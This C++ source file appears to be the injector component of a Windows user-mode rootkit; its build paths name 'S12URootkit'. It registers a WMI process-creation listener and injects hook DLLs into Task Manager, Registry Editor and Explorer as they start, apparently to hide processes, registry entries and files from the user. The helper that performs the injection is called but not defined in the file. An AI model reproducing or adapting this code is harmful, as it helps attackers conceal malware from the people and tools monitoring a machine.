#include <Windows.h>
#include <iostream>
#include <WbemIdl.h>
#include <comutil.h>

using namespace std;

#define PROCESS_DLL "S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
#define PROCESS_DLL_W L"S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
#define PATH_DLL "S:\\MalwareDeveloped\\S12URootkit\\fileHooks\\x64\\Release\\fileHooks.dll"
#define REGISTER_DLL "S:\\MalwareDeveloped\\S12URootkit\\registryHooks\\x64\\Release\\registryHooks.dll"

class EventSink : public IWbemObjectSink
{
    LONG m_lRef;
    bool bDone;

public:
    EventSink() { m_lRef = 0; }
    ~EventSink() { bDone = true; }

    virtual ULONG STDMETHODCALLTYPE AddRef();
    virtual ULONG STDMETHODCALLTYPE Release();
    virtual HRESULT
        STDMETHODCALLTYPE
        QueryInterface(REFIID riid, void** ppv);

    virtual HRESULT STDMETHODCALLTYPE SetStatus(LONG lFlags, HRESULT hResult, BSTR strParam, IWbemClassObject* pObjParam);
    virtual HRESULT STDMETHODCALLTYPE Indicate(LONG lObjectCount, IWbemClassObject** apObjArray);
};

ULONG EventSink::AddRef()
{
    return InterlockedIncrement(&m_lRef);
}

ULONG EventSink::Release()
{
    LONG lRef = InterlockedDecrement(&m_lRef);

    if (lRef == 0)
        delete this;
    return lRef;
}

HRESULT EventSink::QueryInterface(REFIID riid, void** ppv)
{
    if (riid == IID_IUnknown || riid == IID_IWbemObjectSink)
    {
        *ppv = (IWbemObjectSink*)this;
        AddRef();

        return WBEM_S_NO_ERROR;
    }
    else
        return E_NOINTERFACE;
}

HRESULT EventSink::SetStatus(LONG lFlags, HRESULT hResult, BSTR strParam, IWbemClassObject* pObjParam)
{
    return WBEM_S_NO_ERROR;
}

HRESULT EventSink::Indicate(long lObjectCount, IWbemClassObject** pArray)
{
    HRESULT hr = S_OK;
    _variant_t vtProp;

    // Walk through all returned objects
    for (int i = 0; i < lObjectCount; i++)
    {
        IWbemClassObject* pObj = pArray[i];

        // First, get a pointer to the object properties
        hr = pObj->Get(_bstr_t(L"TargetInstance"), 0, &vtProp, 0, 0);
        if (!FAILED(hr))
        {

            // Then, get a pointer to the process object' interface to query its properties
            IUnknown* pProc = vtProp;
            hr = pProc->QueryInterface(IID_IWbemClassObject, (void**)&pObj);
            if (SUCCEEDED(hr))
            {
                _variant_t pVal;

                hr = pObj->Get(L"Name", 0, &pVal, NULL, NULL);
                if (SUCCEEDED(hr))
                {
                    if ((pVal.vt == VT_NULL) || (pVal.vt == VT_EMPTY))
                        printf("Name: %s\n", (pVal.vt == VT_NULL) ? "NULL" : "EMPTY");
                    else
                    {
                        // Check if the process name is one of the specified processes
                        wstring processName = pVal.bstrVal;
                        unordered_map<string, vector<string>> injectionMap;
                        if (processName == L"Taskmgr.exe" || processName == L"regedit.exe" || processName == L"explorer.exe")
                        {
                            if (processName == L"Taskmgr.exe") {
                                injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
                                injectDlls(injectionMap);
                            }
                            else if (processName == L"regedit.exe") {
                                injectionMap["regedit.exe"] = { REGISTER_DLL };
                                injectDlls(injectionMap);
                            }
							else if (processName == L"explorer.exe"){
                                injectionMap["explorer.exe"] = { PATH_DLL };
                                injectDlls(injectionMap);
                            }
                        }
                    }
                }
                VariantClear(&pVal);

            }
        }
        VariantClear(&vtProp);
    }
    return WBEM_S_NO_ERROR;
}

int newProcessListener() {
    HRESULT hres;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        cout << "Failed to initialize COM library. Error code = " << hres << endl;
        return 1;
    }

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        cout << "Failed to initialize security. Error code = " << hres << endl;
        CoUninitialize();
        return 1;

    }
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);

    if (FAILED(hres)) {
        cout << "Failed to create IWbemLocator object. Error code = " << hres << endl;
        CoUninitialize();
        return 1;
    }

    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"root\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);

    if (FAILED(hres)) {
        cout << "Could not connect. Error code = " << hres << endl;
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    if (FAILED(hres)) {
        cout << "Could not set proxy blanket. Error code = " << hres << endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }
    EventSink* pSink = new EventSink;
    pSink->AddRef();

    // Set up the event consumer
    BSTR WQL = SysAllocString(L"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'");
    hres = pSvc->ExecNotificationQueryAsync(_bstr_t("WQL"), _bstr_t(WQL), WBEM_FLAG_SEND_STATUS, NULL, pSink);
    if (FAILED(hres)) {
        cout << "ExecNotificationQueryAsync failed with = " << hres << endl;
        pSvc->Release();
        pLoc->Release();
        pSink->Release();
        CoUninitialize();
        return 1;
    }
    return 0;
}
